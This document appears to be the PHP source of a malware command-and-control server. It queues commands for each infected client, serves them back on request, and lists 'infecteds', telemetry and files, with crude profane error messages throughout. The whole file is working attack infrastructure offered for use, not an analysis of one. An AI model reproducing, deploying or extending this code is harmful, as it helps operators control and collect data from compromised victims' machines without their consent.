<?php
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { # ALLOWS CORS REQUESTS
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: POST, GET, PUT, OPTIONS');
    header('Access-Control-Allow-Headers: ident, class, Content-Type, User-Agent');
    header('Access-Control-Max-Age: 1728000');
    header('Content-Length: 0');
    header('Content-Type: text/plain');
    die();
}
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/json; charset=UTF-8');
date_default_timezone_set("America/Santiago");
// CONSTS
const STATUS = "status";
const DESCRIPTION = "data";

const USERS_DIR = "Users/";
const TELEMETRY_DIR = "Telemetry/";
const COMMANDS_DIR = USERS_DIR . "Commands/";

const COMMAND_PREFIX = "[";
const COMMAND_EXTENSION = "]Command.str";

const REPORT_PREFIX = "userID_";
const REPORT_EXTENSION = ".rtp";

const TELEMETRY_PREFIX = "telemetry_";
const TELEMETRY_EXTENSION = ".tlm";

$retorno = array(
    STATUS => "",
    DESCRIPTION => ""
);
$clase = null;
$ident = null;
$content = null;
$headers = getallheaders();
function VerifySession() {
    global $headers, $clase, $retorno, $ident;
    if (!array_key_exists('class', $headers)) {
        http_response_code(400);
        $retorno[STATUS] = "NO_CLASS_HEADER";
        die(json_encode($retorno));
    }
    if ((!isset($headers['class'])) || $headers['class'] == "") {
        header('Content-Type: application/json; charset=UTF-8');
        http_response_code(400);
        $retorno[STATUS] = "CLASS_IS_EMPTY";
        die(json_encode($retorno));
    }
    if (!array_key_exists('ident', $headers)) {
        header('Content-Type: application/json; charset=UTF-8');
        http_response_code(400);
        $retorno[STATUS] = "NO_UID_HEADER";
        die(json_encode($retorno));
    }
    if ((!isset($headers['ident'])) || $headers['ident'] == "") {
        header('Content-Type: application/json; charset=UTF-8');
        http_response_code(400);
        $retorno[STATUS] = "UID_IS_EMPTY";
        die(json_encode($retorno));
    }

    $ident = $headers['ident'];
    $clase = $headers['class'];
}
function CheckAuth() {
    global $retorno, $ident;
    if (!file_exists(USERS_DIR . REPORT_PREFIX . $ident . REPORT_EXTENSION)) {
        http_response_code(401);
        $retorno[STATUS] = "WHO_THE_FUCK_ARE_YOU";
        $retorno[DESCRIPTION] = "YOU FUCKING BITCH 👿, WHO THE FUCKA RE U LMAOO 😂";
        die(json_encode($retorno));
    }
}
VerifySession();
AddSessionToLog();
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $content = json_decode(file_get_contents('php://input'), true);
    switch ($clase) {
        case "PING":
            http_response_code(200);
            $retorno[STATUS] = "PONG!";
            $retorno[DESCRIPTION] = $clase;
            die(json_encode($retorno));
            break;
        case "COMMAND":
            CheckAuth();
            $archivo = COMMANDS_DIR . COMMAND_PREFIX . $ident . COMMAND_EXTENSION;
            if (!array_key_exists("command1", $content) && !array_key_exists("command2", $content) && !array_key_exists("command3", $content)) {
                http_response_code(400);
                $retorno[STATUS] = "ERROR";
                $retorno[DESCRIPTION] = "Command line parameter not found.";
                die(json_encode($retorno));
            }
            $command = "#|".$headers["User-Agent"]."|".$ident."|".date('H:i:s d/m/Y').
            "\nCommand1>".(array_key_exists("command1", $content) ? $content["command1"] : "").
            "\nCommand2>".(array_key_exists("command2", $content) ? $content["command2"] : "").
            "\nCommand3>".(array_key_exists("command3", $content) ? $content["command3"] : "").
            "\n[Response]\n";
            if (file_exists($archivo)) {
                file_put_contents($archivo, $command);
            } else {
                $myfile = fopen($archivo, "w");
                fwrite($myfile, $command);
                fclose($myfile);
            }
            http_response_code(201);
            $retorno[STATUS] = "OK";
            $retorno[DESCRIPTION] = $content;
            die(json_encode($retorno));
            break;
        default:
            http_response_code(400);
            $retorno[STATUS] = "SWITCH_DEFAULT";
            die(json_encode($retorno));
    }
    http_response_code(200);
    $retorno[STATUS] = "DONE";
    $retorno[DESCRIPTION] = $clase;
    die(json_encode($retorno));
} elseif ($_SERVER['REQUEST_METHOD'] === 'GET') {
    switch ($clase) {
        case "PING":
            http_response_code(200);
            $retorno[STATUS] = "PONG!";
            $retorno[DESCRIPTION] = $clase;
            die(json_encode($retorno));
            break;
        case "COMMAND":
            $archivo = COMMANDS_DIR . COMMAND_PREFIX . $ident . COMMAND_EXTENSION;
            $return = array(); 
            foreach(file($archivo) as $i => $linea) {
                if ($i != 0 && $i < 4) {
                    $return[] = str_replace("\n", "", substr($linea, strpos($linea, ">") + 1));
                }
            }
            http_response_code(200);
            $retorno[STATUS] = "OK";
            $retorno[DESCRIPTION] = $return;
            die(json_encode($retorno));
            break;
        case "LIST-INFECTEDS":
            $infecteds = array();
            foreach (new DirectoryIterator('Users/') as $file) {
                if ($file->isDot() || $file->getFilename() == "Commands") continue;
                $infected = $file->getFilename();
                $infected = str_replace(["userID_", ".rtp"], "", $infected);
                $infecteds[] = $infected;
            }
            http_response_code(200);
            $retorno[STATUS] = "OK";
            $retorno[DESCRIPTION] = $infecteds;
            die(json_encode($retorno));
            break;
        case "LIST-TELEMETRY":
            $telemetries = array();
            foreach (new DirectoryIterator('Telemetry/') as $file) {
                if ($file->isDot() || $file->getFilename() == "tlmRefresh.php") continue;
                $telemetry = $file->getFilename();
                $telemetry = str_replace(["telemetry_", ".tlm"], "", $telemetry);
                $telemetries[] = $telemetry;
            }
            http_response_code(200);
            $retorno[STATUS] = "OK";
            $retorno[DESCRIPTION] = $telemetry;
            die(json_encode($retorno));
            break;
        case "LIST-FILES":
            $files = array();
            foreach (new DirectoryIterator('Files/') as $file) {
                if ($file->isDot()) continue;
                $file_ = $file->getFilename();
                $files[] = $file_;
            }
            http_response_code(200);
            $retorno[STATUS] = "OK";
            $retorno[DESCRIPTION] = $files;
            die(json_encode($retorno));
            break;
        default:
            http_response_code(400);
            $retorno[STATUS] = "ERROR";
            $retorno[DESCRIPTION] = "SWITCH DEFAULT";
            die(json_encode($retorno));
    }
    http_response_code(200);
    die($retorno);
} else {
    header('Content-Type: application/json; charset=UTF-8');
    http_response_code(418);
    $retorno[STATUS] = "METHOD_NOT_ALLOWED";
    $retorno[DESCRIPTION] = "Get the fuck away from here.";
    die(json_encode($retorno));
}
function AddSessionToLog() {
    global $clase, $ident;
    $data = null;
    $data = $_SERVER['REMOTE_ADDR'] . "\n"
        . "    " . date('d/m/Y H:i:s') . "\n"
        . "    " . $_SERVER['REQUEST_METHOD'] . " : " . $_SERVER['PHP_SELF'] . "\n"
        . "    " . $_SERVER['HTTP_USER_AGENT'] . "\n"
        . "    " . $clase . " : " . $ident . "\n";
    file_put_contents('api-v2.log', $data . PHP_EOL, FILE_APPEND | LOCK_EX);
}